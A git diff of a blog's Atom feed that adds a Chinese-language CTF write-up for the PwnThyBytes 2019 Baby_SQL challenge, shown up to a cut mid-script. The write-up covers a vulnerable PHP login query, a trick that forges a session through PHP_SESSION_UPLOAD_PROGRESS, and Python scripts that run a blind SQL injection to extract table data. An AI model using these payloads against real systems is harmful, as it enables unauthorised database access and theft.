@@ -94,6 +94,7 @@
     <category term="xpath注入" />
     <category term="Padding oracle attack 与CBC翻转字节攻击" />
     <category term="php" />
+    <category term="sql盲注" />
     <entry>
         <id>http://odiws.github.io/2025/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
         <title>java反序列化学习笔记</title>
@@ -527,6 +528,34 @@ $主要是在Struts 2配置文件中，引用OGNL表达式
         <category term="buuctf" />
         <category term="java" />
         <updated>2024-12-06T01:34:32.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/10/15/PwnThyBytes%E2%80%94%E2%80%942019-Baby-SQL/</id>
+        <title>[PwnThyBytes——2019]Baby_SQL</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/10/15/PwnThyBytes%E2%80%94%E2%80%942019-Baby-SQL/"/>
+        <content type="html">&lt;h2 id=&#34;pwnthybytes2019baby_sql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwnthybytes2019baby_sql&#34;&gt;#&lt;/a&gt; [PwnThyBytes——2019]Baby_SQL&lt;/h2&gt;
+&lt;p&gt;ctrl+u 最下面：&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- /source.zip --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;下载发现 /template 目录下的漏洞：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;!isset($_SESSION) AND die(&amp;quot;Direct access on this script is not allowed!&amp;quot;);
+include &#39;db.php&#39;;
+
+$sql = &#39;SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`=&amp;quot;&#39; . $_GET[&#39;username&#39;] . &#39;&amp;quot; and password=&amp;quot;&#39; . md5($_GET[&#39;password&#39;]) . &#39;&amp;quot;;&#39;;
+$result = $con-&amp;gt;query($sql);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;前提就是绕过这个 isset（$_SESSION）, 但是只有 regieter 和 login 有 SESSION 数组只有在 session_start () 初始化后才产生，所以只能伪造一个 session 来绕过 index，进行 sql 注入。&lt;/p&gt;
+&lt;h4 id=&#34;在phpsession里如果在phpini中设置sessionauto_starton那么php每次处理php文件的时候都会自动执行session_start但是sessionauto_start默认为off-与session相关的另一个叫sessionupload_progressenabled默认为on在这个选项被打开的前提下我们在multipart-post的时候传入php_session_upload_progressphp会执行session_start&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#在phpsession里如果在phpini中设置sessionauto_starton那么php每次处理php文件的时候都会自动执行session_start但是sessionauto_start默认为off-与session相关的另一个叫sessionupload_progressenabled默认为on在这个选项被打开的前提下我们在multipart-post的时候传入php_session_upload_progressphp会执行session_start&#34;&gt;#&lt;/a&gt; 在 phpsession 里如果在 php.ini 中设置 session.auto_start=On，那么 PHP 每次处理 PHP 文件的时候都会自动执行 session_start ()，但是 session.auto_start 默认为 Off。与 Session 相关的另一个叫 session.upload_progress.enabled，默认为 On，在这个选项被打开的前提下我们在 multipart POST 的时候传入 PHP_SESSION_UPLOAD_PROGRESS，PHP 会执行 session_start ()&lt;/h4&gt;
+&lt;h4 id=&#34;这个方法同样可以用来进行文件包含和反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#这个方法同样可以用来进行文件包含和反序列化&#34;&gt;#&lt;/a&gt; 这个方法同样可以用来进行文件包含和反序列化&lt;/h4&gt;
+&lt;p&gt;直接脚本 bp 抓包：&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://6a742e0c-c6b0-49a3-b626-f5f0578d17f1.node3.buuoj.cn/templates/login.php&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;files &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;123456789&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; files&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;files&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;123456789&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                  cookies&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;PHPSESSID&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;test1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; params&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;username&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;password&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                  proxies&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;http&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://127.0.0.1:8080&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/IGotIt/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
+&lt;p&gt;返回 try again 就差不多了&lt;/p&gt;
+&lt;p&gt;双引号闭合：&lt;/p&gt;
+&lt;p&gt;exp:&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://6a742e0c-c6b0-49a3-b626-f5f0578d17f1.node3.buuoj.cn/templates/login.php&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;files &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;123456789&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;字段值&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    low &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    high &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;high&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; high&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.06&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# payload_flag =&amp;#123;&#39;username&#39;: &#34;test\&#34; or (ascii(substr((select group_concat(username) from ptbctf ),&amp;#123;0&amp;#125;,1))&gt;&amp;#123;1&amp;#125;) #&#34;.format(i, mid),&#39;password&#39;: &#39;test&#39;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        payload_flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#39;username&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;test\&#34; or (ascii(substr((select group_concat(secret) from flag_tbl ),&amp;#123;0&amp;#125;,1))&gt;&amp;#123;1&amp;#125;) #&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;password&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        r &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;params&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;payload_flag&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;files&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;files&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;123456789&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                  cookies&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;PHPSESSID&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;test1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload_flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;meta http-equiv=&#34;refresh&#34; content=&#34;0; url=?p=home&#34; /&gt;&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            low &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            high &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;low &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; high&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mid&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;132&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    flag &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# column=&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# for i in range(1,100):&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     low = 32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     high = 128&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     mid = (low+high)//2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#     while (low &amp;lt; high):&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         time.sleep(0.06)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#         payload_column =&amp;#123;&#39;username&#39;: &#34;test\&#34; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#39;flag_tbl\&#39; ),&amp;#123;0&amp;#125;,1))&gt;&amp;#123;1&amp;#125;) #&#34;.format(i, mid),&#39;password&#39;: 